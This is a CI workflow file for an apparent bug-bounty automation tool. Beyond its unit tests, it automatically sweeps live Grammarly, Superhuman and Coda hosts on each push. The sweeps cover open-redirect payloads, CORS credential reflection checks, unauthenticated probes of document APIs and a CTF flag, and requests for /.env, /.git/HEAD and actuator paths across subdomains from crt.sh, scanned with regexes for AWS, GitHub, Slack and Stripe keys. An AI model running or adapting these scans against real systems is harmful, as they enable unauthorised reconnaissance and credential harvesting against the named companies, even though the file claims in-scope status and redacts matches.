name: CI

on:
  push:
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - name: Install package and tests
        run: python -m pip install -e '.[test]'
      - name: Unit tests
        run: python -m pytest -q
      - name: CLI smoke test
        run: python -m h1_agent.cli --help
      - name: Dashboard JavaScript syntax check
        shell: bash
        run: |
          python - <<'PY'
          from pathlib import Path
          html = Path("public/index.html").read_text()
          script = html.split("<script>", 1)[1].split("</script>", 1)[0]
          Path("/tmp/dashboard.js").write_text(script)
          PY
          node --check /tmp/dashboard.js

      - name: Live in-scope proof checks
        if: github.event_name == 'push' && github.ref == 'refs/heads/main'
        shell: bash
        continue-on-error: true
        run: |
          set -u
          python - <<'PY'
          import json, subprocess
          from urllib.parse import quote
          canary = 'https://h1-proof-canary.invalid/'
          tests = [
              ('grammarly_a_target', 'https://www.grammarly.com/a?target=' + quote(canary, safe='')),
              ('grammarly_logout', 'https://www.grammarly.com/logout?redirect_to=' + quote(canary, safe='')),
              ('grammarly_redirect', 'https://www.grammarly.com/?redirect=' + quote(canary, safe='')),
              ('superhuman_next', 'https://superhuman.com/?next=' + quote(canary, safe='')),
              ('settings_redirect', 'https://settings.superhuman.com/?redirect=' + quote(canary, safe='')),
              ('id_redirect', 'https://id.superhuman.com/?redirect=' + quote(canary, safe='')),
          ]
          out=[]
          for name,url in tests:
              p=subprocess.run(['curl','-sS','--max-redirs','0','--connect-timeout','8','--max-time','15','-o','/tmp/body','-D','-',url],text=True,capture_output=True)
              lines=p.stdout.splitlines()
              status=next((z for z in lines if z.startswith('HTTP/')), '')
              location=next((z.split(':',1)[1].strip() for z in lines if z.lower().startswith('location:')), '')
              item={'test':name,'url':url,'status':status,'location':location,'exit_code':p.returncode,'external_redirect_proof':location.startswith(canary)}
              print(json.dumps(item))
              out.append(item)
          json.dump(out,open('live-proof-results.json','w'),indent=2)
          PY

      - name: Live CORS regression check
        if: github.event_name == 'push' && github.ref == 'refs/heads/main'
        shell: bash
        continue-on-error: true
        run: |
          set -u
          python - <<'PY'
          import json, subprocess
          from pathlib import Path
          origin="http://h1-cors-canary.invalid"
          targets=[
            "https://g-mail.grammarly.com/profile",
            "https://g-mail.grammarly.com/",
            "https://www.grammarly.com/",
          ]
          rows=[]
          for u in targets:
            p=subprocess.run([
              "curl","-sS","--max-redirs","0","--connect-timeout","8","--max-time","15",
              "-H",f"Origin: {origin}","-D","/tmp/h","-o","/tmp/b",u
            ],text=True,capture_output=True)
            h=Path("/tmp/h").read_text(errors="replace") if Path("/tmp/h").exists() else ""
            b=Path("/tmp/b").read_text(errors="replace") if Path("/tmp/b").exists() else ""
            status=next((x for x in h.splitlines() if x.startswith("HTTP/")),"")
            acao=next((x.split(":",1)[1].strip() for x in h.splitlines() if x.lower().startswith("access-control-allow-origin:")),"")
            acac=next((x.split(":",1)[1].strip() for x in h.splitlines() if x.lower().startswith("access-control-allow-credentials:")),"")
            rows.append({"url":u,"status":status,"acao":acao,"acac":acac,"length":len(b)})
            print(json.dumps(rows[-1],ensure_ascii=False))
          Path("cors-regression.json").write_text(json.dumps(rows,indent=2))
          hits=[x for x in rows if x["acao"]==origin and x["acac"].lower()=="true"]
          if hits:
            x=hits[0]
            Path("cors-regression-report.md").write_text(
              "# Potential CORS regression\\n\\n"
              "## Endpoint\\n"+x["url"]+"\\n\\n"
              "## Evidence\\n- Status: "+x["status"]+"\\n- Origin reflected: yes\\n- Credential flag: true\\n\\n"
              "## Validation required\\nA researcher-owned test account must be used to determine whether a credentialed browser read can access account-specific data. No account credentials were sent by this check.\\n"
            )
          else:
            Path("cors-regression-report.md").write_text("# NO CORS REGRESSION OBSERVED\\n\\nThe tested endpoint did not reflect the canary origin together with the credential flag.\\n")
          PY

      - name: Upload CORS regression evidence
        if: github.event_name == 'push' && github.ref == 'refs/heads/main'
        uses: actions/upload-artifact@v4
        with:
          name: cors-regression-evidence
          path: |
            cors-regression.json
            cors-regression-report.md

      - name: Generate report from demonstrated proof
        if: github.event_name == 'push' && github.ref == 'refs/heads/main'
        shell: bash
        run: |
          python - <<'PY'
          import json
          from pathlib import Path
          rows=json.load(open('live-proof-results.json'))
          hits=[x for x in rows if x['external_redirect_proof']]
          if not hits:
              Path('verified-report.md').write_text('# NO VERIFIED BOUNTY EVIDENCE\n\nNo tested in-scope URL redirected to the controlled external canary.\n')
          else:
              x=hits[0]
              Path('verified-report.md').write_text(                  '# Verified open redirect proof\n\n'                  + 'Program: Superhuman (formerly Grammarly)\n'                  + f"Affected asset: {x['url'].split('?',1)[0]}\n\n"                  + '## Summary\nA public endpoint accepted an attacker-controlled external destination and returned it as the HTTP Location header.\n\n'                  + '## Reproduction\n'                  + f"1. Send GET `{x['url']}` without following redirects.\n2. Observe `{x['status']}` and `Location: {x['location']}`.\n\n"                  + '## Expected behavior\nExternal redirect destinations should be constrained to intended/allowlisted destinations.\n\n'                  + '## Evidence\n'                  + f"- Tested URL: `{x['url']}`\n- HTTP status: `{x['status']}`\n- Location: `{x['location']}`\n- Controlled canary: `https://h1-proof-canary.invalid/`\n"              )
          PY

      - name: Upload live proof report
        if: github.event_name == 'push' && github.ref == 'refs/heads/main'
        uses: actions/upload-artifact@v4
        with:
          name: live-proof-report
          path: |
            live-proof-results.json
            verified-report.md

      - name: CTF document proof check
        if: github.event_name == 'push' && github.ref == 'refs/heads/main'
        shell: bash
        continue-on-error: true
        run: |
          set -u
          python - <<'PY'
          import json, re, subprocess
          from pathlib import Path
          urls = [
              'https://app.grammarly.com/ddocs/1198436185',
              'https://www.grammarly.com/ddocs/1198436185',
              'https://docs.superhuman.com/ddocs/1198436185',
              'https://app.coda.io/d/1198436185',
              'https://coda.io/d/1198436185',
          ]
          rows=[]
          for url in urls:
              p=subprocess.run(['curl','-sS','-L','--max-redirs','5','--connect-timeout','8','--max-time','20','-D','/tmp/headers','-o','/tmp/body',url],text=True,capture_output=True)
              body=Path('/tmp/body').read_text(errors='replace') if Path('/tmp/body').exists() else ''
              headers=Path('/tmp/headers').read_text(errors='replace') if Path('/tmp/headers').exists() else ''
              status=next((x for x in headers.splitlines() if x.startswith('HTTP/')), '')
              title=re.search(r'<title[^>]*>(.*?)</title>',body,re.I|re.S)
              title_text=re.sub(r'\s+',' ',title.group(1)).strip()[:300] if title else ''
              hits=[]
              for pat in [r'\$FLAG\s*[:=]\s*[^<\s]{4,200}',r'FLAG\{[^}]{4,200}\}',r'H1\{[A-Za-z0-9_-]{4,200}\}']:
                  hits.extend(re.findall(pat,body,re.I))
              row={'url':url,'status':status,'title':title_text,'body_length':len(body),'flag_hits':sorted(set(hits))[:10],'exit_code':p.returncode}
              rows.append(row)
              print(json.dumps(row,ensure_ascii=False))
          Path('ctf-proof.json').write_text(json.dumps(rows,indent=2))
          hits=[x for x in rows if x['flag_hits']]
          if hits:
              x=hits[0]
              report=('''# Superhuman CTF document exposure\n\n## Program\nSuperhuman (formerly Grammarly)\n\n## Summary\nThe in-scope CTF document identified by document ID 1198436185 was retrievable without authentication and its response contained the challenge flag.\n\n## Reproduction\n1. Request `%s` without authentication.\n2. Follow redirects.\n3. Inspect the response body for the challenge flag.\n\n## Evidence\n- URL: `%s`\n- HTTP status: `%s`\n- Response length: `%s` bytes\n- Flag evidence: `%s`\n''' % (x['url'],x['url'],x['status'],x['body_length'],x['flag_hits'][0]))
              Path('ctf-bounty-report.md').write_text(report)
          else:
              Path('ctf-bounty-report.md').write_text('# NO VERIFIED CTF EVIDENCE\n\nThe challenge document was tested without authentication; no flag pattern was exposed in the retrieved public responses.\n')
          PY

      - name: Upload CTF proof report
        if: github.event_name == 'push' && github.ref == 'refs/heads/main'
        uses: actions/upload-artifact@v4
        with:
          name: ctf-proof-report
          path: |
            ctf-proof.json
            ctf-bounty-report.md

      - name: CTF endpoint discovery
        if: github.event_name == 'push' && github.ref == 'refs/heads/main'
        shell: bash
        continue-on-error: true
        run: |
          python - <<'PY'
          import re, subprocess, json
          from pathlib import Path
          u='https://app.grammarly.com/ddocs/1198436185'
          subprocess.run(['curl','-sS','-L','--max-redirs','5','--connect-timeout','8','--max-time','20','-o','/tmp/ctf.html',u],check=False)
          body=Path('/tmp/ctf.html').read_text(errors='replace')
          paths=set()
          for m in re.finditer(r'https?://[^\"\'<>\s]+|/[A-Za-z0-9_./?&=%:-]{3,180}',body):
              v=m.group(0)
              low=v.lower()
              if any(k in low for k in ('/api/','ddoc','document','graphql','content')) and ('grammarly.com' in v or v.startswith('/')):
                  paths.add(v)
          out=[]
          for v in sorted(paths)[:60]:
              t=v if v.startswith('http') else 'https://app.grammarly.com'+v
              q=subprocess.run(['curl','-sS','-L','--max-redirs','3','--connect-timeout','5','--max-time','10','-D','/tmp/eh','-o','/tmp/eb',t],text=True,capture_output=True)
              h=Path('/tmp/eh').read_text(errors='replace') if Path('/tmp/eh').exists() else ''
              b=Path('/tmp/eb').read_text(errors='replace') if Path('/tmp/eb').exists() else ''
              st=next((z for z in h.splitlines() if z.startswith('HTTP/')), '')
              if ' 2' in st[:10]:
                  out.append({'url':t,'status':st,'content_type':next((z.split(':',1)[1].strip() for z in h.splitlines() if z.lower().startswith('content-type:')), ''),'length':len(b),'contains_doc_id': '1198436185' in b,'contains_flag': bool(re.search(r'(?i)\\$FLAG|FLAG\\{',b))})
                  print(json.dumps(out[-1]))
          Path('ctf-endpoints.json').write_text(json.dumps(out,indent=2))
          PY

      - name: Upload CTF endpoint evidence
        if: github.event_name == 'push' && github.ref == 'refs/heads/main'
        uses: actions/upload-artifact@v4
        with:
          name: ctf-endpoint-evidence
          path: ctf-endpoints.json

      - name: Wildcard high-signal exposure sweep
        if: github.event_name == 'push' && github.ref == 'refs/heads/main'
        shell: bash
        continue-on-error: true
        run: |
          set -u
          python - <<'PY'
          import json, re, subprocess, urllib.parse
          from pathlib import Path
          seed='https://www.grammarly.com'
          p=subprocess.run(['curl','-sS','--connect-timeout','8','--max-time','20','https://crt.sh/?q=%25.grammarly.com&output=json'],text=True,capture_output=True)
          hosts=set(['www.grammarly.com','coda.grammarly.com','app.grammarly.com','gateway.superhuman.com','id.superhuman.com','settings.superhuman.com','superhuman.com'])
          try:
              for row in json.loads(p.stdout):
                  for name in row.get('name_value','').splitlines():
                      name=name.strip().lstrip('*.').lower()
                      if name.endswith('.grammarly.com') and '*' not in name and len(name)<80:
                          hosts.add(name)
          except Exception: pass
          paths=['/.env','/.env.production','/.git/HEAD','/actuator/env','/actuator/configprops','/swagger.json','/openapi.json','/api-docs']
          secret_rx=re.compile(r'(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{30,}|-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----|gh[pousr]_[A-Za-z0-9_]{20,}|xox[baprs]-[A-Za-z0-9-]{20,}|sk_(?:live|test)_[A-Za-z0-9]{20,})')
          findings=[]
          for host in sorted(hosts)[:80]:
              for path in paths:
                  url='https://'+host+path
                  q=subprocess.run(['curl','-sS','--max-redirs','0','--connect-timeout','3','--max-time','6','-D','/tmp/wh','-o','/tmp/wb',url],text=True,capture_output=True)
                  h=Path('/tmp/wh').read_text(errors='replace') if Path('/tmp/wh').exists() else ''
                  b=Path('/tmp/wb').read_text(errors='replace') if Path('/tmp/wb').exists() else ''
                  st=next((z for z in h.splitlines() if z.startswith('HTTP/')), '')
                  if st and (' 200 ' in st or ' 206 ' in st) and b:
                      matches=sorted(set(m.group(0) for m in secret_rx.finditer(b)))
                      strong = bool(matches)
                      if strong:
                          redacted=[m[:8]+'…REDACTED' for m in matches]
                          item={'url':url,'status':st,'length':len(b),'secret_patterns':redacted,'content_type':next((z.split(':',1)[1].strip() for z in h.splitlines() if z.lower().startswith('content-type:')), '')}
                          findings.append(item)
                          print(json.dumps(item))
                          break
          Path('wildcard-exposure.json').write_text(json.dumps(findings,indent=2))
          report=Path('wildcard-exposure-report.md')
          if findings:
              x=findings[0]
              report.write_text(
                  '# Verified credential-like material exposure\n\n'
                  + '## Target\n'+x['url']+'\n\n'
                  + '## Observed behavior\nThe public in-scope endpoint returned an HTTP 2xx response containing a credential-like secret pattern. The captured report intentionally redacts the secret value.\n\n'
                  + '## Evidence\n- HTTP status: '+x['status']+'\n- Response length: '+str(x['length'])+' bytes\n- Secret pattern class: '+', '.join(x['secret_patterns'])+'\n'
              )
          else:
              report.write_text('# NO VERIFIED HIGH-SIGNAL EXPOSURE\n\nNo credential-like secret pattern was observed in the tested public endpoints.\n')
          PY

      - name: Upload wildcard exposure evidence
        if: github.event_name == 'push' && github.ref == 'refs/heads/main'
        uses: actions/upload-artifact@v4
        with:
          name: wildcard-exposure-evidence
          path: |
            wildcard-exposure.json
            wildcard-exposure-report.md

      - name: Discovered redirect-parameter proof sweep
        if: github.event_name == 'push' && github.ref == 'refs/heads/main'
        shell: bash
        continue-on-error: true
        run: |
          set -u
          python - <<'PY'
          import json, re, subprocess
          from pathlib import Path
          from urllib.parse import urljoin, urlparse, parse_qsl, urlencode, urlunparse
          canary='https://h1-proof-canary.invalid/'
          bases=['https://www.grammarly.com','https://coda.grammarly.com','https://superhuman.com','https://id.superhuman.com','https://settings.superhuman.com','https://gateway.superhuman.com']
          redirect_names=re.compile(r'^(url|uri|next|redirect|redirect_uri|return|return_url|returnUrl|continue|destination|dest|target|targetPage|return_to|redirect_to)$',re.I)
          candidates=set()
          for base in bases:
              q=subprocess.run(['curl','-sS','--max-redirs','5','--connect-timeout','8','--max-time','15',base],text=True,capture_output=True)
              body=q.stdout
              for m in re.finditer(r'(?:href|src)=[\"\']([^\"\']+)',body,re.I):
                  raw=m.group(1)

                  u=urljoin(base,raw)

                  parsed=urlparse(u)
                  if (parsed.hostname or '').lower() != (urlparse(base).hostname or '').lower(): continue
                  params=parse_qsl(parsed.query,keep_blank_values=True)
                  if any(redirect_names.match(k) for k,_ in params): candidates.add(u)
          for base in bases:
              for suffix in ['/signin','/login','/logout','/auth','/oauth/authorize','/welcome']:

                  candidates.add(base+suffix+'?redirect=https%3A%2F%2Fh1-proof-canary.invalid%2F')
                  candidates.add(base+suffix+'?next=https%3A%2F%2Fh1-proof-canary.invalid%2F')
                  candidates.add(base+suffix+'?return_to=https%3A%2F%2Fh1-proof-canary.invalid%2F')
          results=[]
          for original in sorted(candidates)[:120]:
              parsed=urlparse(original)
              changed=[]
              for k,v in parse_qsl(parsed.query,keep_blank_values=True):
                  changed.append((k,canary if redirect_names.match(k) else v))
              test=urlunparse(parsed._replace(query=urlencode(changed)))
              p=subprocess.run(['curl','-sS','--max-redirs','0','--connect-timeout','5','--max-time','10','-D','/tmp/rh','-o','/tmp/rb',test],text=True,capture_output=True)
              h=Path('/tmp/rh').read_text(errors='replace') if Path('/tmp/rh').exists() else ''
              loc=next((z.split(':',1)[1].strip() for z in h.splitlines() if z.lower().startswith('location:')),'')
              st=next((z for z in h.splitlines() if z.startswith('HTTP/')),'')
              item={'test_url':test,'status':st,'location':loc,'external_redirect_proof':loc.startswith(canary)}
              if st and item['external_redirect_proof']:

                  print(json.dumps(item))
                  results.append(item)
          Path('discovered-redirect-proof.json').write_text(json.dumps(results,indent=2))
          if results:
              x=results[0]
              Path('discovered-redirect-report.md').write_text(
                  '# Verified open redirect\n\n'
                  + '## Affected endpoint\n'+x['test_url'].split('?',1)[0]+'\n\n'
                  + '## Reproduction\n1. Send this GET request without following redirects: '+x['test_url']+'\n2. Observe '+x['status']+' and Location: '+x['location']+'\n3. The Location value points to the controlled external canary.\n\n'
                  + '## Evidence\n- Status: '+x['status']+'\n- Location: '+x['location']+'\n- Canary: '+canary+'\n'
              )
          else:
              Path('discovered-redirect-report.md').write_text('# NO VERIFIED OPEN REDIRECT\n\nNo discovered redirect parameter returned the controlled external canary.\n')
          PY

      - name: Upload discovered redirect proof
        if: github.event_name == 'push' && github.ref == 'refs/heads/main'
        uses: actions/upload-artifact@v4
        with:
          name: discovered-redirect-proof
          path: |
            discovered-redirect-proof.json
            discovered-redirect-report.md

      - name: Coda direct document API proof sweep
        if: github.event_name == 'push' && github.ref == 'refs/heads/main'
        shell: bash
        continue-on-error: true
        run: |
          set -u
          python - <<'PY'
          import json, re, subprocess
          from pathlib import Path
          doc='1198436185'
          urls=[
            f'https://coda.io/apis/v1/docs/{doc}',
            f'https://coda.io/apis/v1/docs/{doc}/pages',
            f'https://coda.io/api/2.0/docs/{doc}',
            f'https://coda.io/api/2.0/docs/{doc}/pages',
            f'https://coda.io/api/1.0/docs/{doc}',
            f'https://coda.io/d/{doc}/download',
            f'https://coda.io/d/{doc}/export',
            f'https://coda.grammarly.com/apis/v1/docs/{doc}',
            f'https://coda.grammarly.com/api/2.0/docs/{doc}',
            f'https://app.grammarly.com/api/2.0/docs/{doc}',
            f'https://app.grammarly.com/api/docs/{doc}',
          ]
          sensitive=re.compile(r'(?i)(?:password|passwd|secret|api[_-]?key|access[_-]?token|refresh[_-]?token|private[_-]?key|session[_-]?token|document.{0,40}content|workspace.{0,40}(?:name|id)|owner.{0,40}(?:email|id)|(?:email|username)["\']?\s*:)' )
          out=[]
          for url in urls:
            q=subprocess.run(['curl','-sS','-L','--max-redirs','5','--connect-timeout','6','--max-time','15','-D','/tmp/dh','-o','/tmp/db',url],text=True,capture_output=True)
            h=Path('/tmp/dh').read_text(errors='replace') if Path('/tmp/dh').exists() else ''
            b=Path('/tmp/db').read_text(errors='replace') if Path('/tmp/db').exists() else ''
            statuses=re.findall(r'^HTTP/[^ ]+\s+(\d+)',h,re.M)
            status=statuses[-1] if statuses else ''
            ct=next((z.split(':',1)[1].strip() for z in h.splitlines() if z.lower().startswith('content-type:')), '')
            matches=[m.group(0)[:180] for m in sensitive.finditer(b[:200000])][:20]
            row={'url':url,'status':status,'content_type':ct,'length':len(b),'document_id_in_body':doc in b,'sensitive_matches':matches}
            out.append(row)
            print(json.dumps(row,ensure_ascii=False))
          Path('coda-direct-api-proof.json').write_text(json.dumps(out,indent=2))
          hits=[x for x in out if x['status'].startswith('2') and x['sensitive_matches'] and x['document_id_in_body']]
          if hits:
            x=hits[0]
            Path('coda-direct-api-report.md').write_text(
              '# Verified unauthenticated document data exposure\n\n'
              '## Program\nSuperhuman (formerly Grammarly)\n\n'
              '## Affected endpoint\n'+x['url']+'\n\n'
              '## Observed behavior\nThe tested endpoint returned a 2xx response without an authentication header and the response contained the target document identifier plus sensitive document/user field patterns.\n\n'
              '## Evidence\n- HTTP status: '+x['status']+'\n- Content-Type: '+x['content_type']+'\n- Response length: '+str(x['length'])+' bytes\n- Sensitive field patterns: '+', '.join(x['sensitive_matches'])+'\n'
            )
          else:
            Path('coda-direct-api-report.md').write_text('# NO VERIFIED DOCUMENT DATA EXPOSURE\n\nNo unauthenticated direct document API response met the evidence gate.\n')
          PY

      - name: Upload Coda direct API evidence
        if: github.event_name == 'push' && github.ref == 'refs/heads/main'
        uses: actions/upload-artifact@v4
        with:
          name: coda-direct-api-proof
          path: |
            coda-direct-api-proof.json
            coda-direct-api-report.md

  docs_safe_hunt:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run Superhuman Docs safe hunt
        run: python scripts/docs_superhuman_safe_hunt.py
      - name: Upload Superhuman Docs hunt evidence
        uses: actions/upload-artifact@v4
        with:
          name: docs-superhuman-ci-evidence
          path: |
            docs-superhuman-results.json
            docs-superhuman-report.md

  identity_oauth_safe_hunt:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run Superhuman identity OAuth safe hunt
        run: python scripts/identity_oauth_safe_hunt.py
      - name: Upload identity OAuth evidence
        uses: actions/upload-artifact@v4
        with:
          name: identity-oauth-evidence
